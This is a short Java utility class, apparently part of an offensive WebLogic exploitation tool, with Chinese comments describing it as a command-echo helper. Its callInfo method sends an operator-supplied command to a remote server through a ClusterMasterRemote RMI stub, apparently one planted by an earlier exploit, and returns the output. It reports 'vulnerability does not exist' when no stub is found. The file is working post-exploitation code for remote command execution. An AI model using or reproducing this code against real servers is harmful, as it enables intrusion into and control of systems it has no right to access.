package com.r4v3zn.weblogic.tools.utils;

import com.r4v3zn.weblogic.tools.entity.MyException;
import weblogic.cluster.singleton.ClusterMasterRemote;

import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.List;

import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: CallUtils
 * Desc: 回显工具类
 * Date:2020/4/3 18:59
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 *
 * @author R4v3zn
 * @version 1.0.0
 */
public class CallUtils {

    /**
     * 私有化构造防止被实例化
     */
    private CallUtils(){}

    public static final List<String> CALL_CLASS = new ArrayList<String>(){{
        add("ClusterMasterRemote");
        add("NamingNode");
        add("RemoteChannelService");
        add("RemoteLeasingBasis");
        add("RemoteMigratableServiceCoordinator");
        add("SingletonMonitorRemote");
        add("SubCoordinatorRM");
    }};

    /**
     * 执行命令并且回显
     * @param cmd 执行命令
     * @param remote 远程 Stub
     * @return
     */
    public static String callInfo(String cmd, ClusterMasterRemote remote) throws RemoteException {
        if(remote == null){
            throw new MyException("漏洞不存在");
        }
        if(isBlank(cmd)){
            throw new MyException("请输入执行命令");
        }
        String currentOs = System.getProperty("os.name");
        cmd += "@@"+currentOs;
        return remote.getServerLocation(cmd);
    }

}
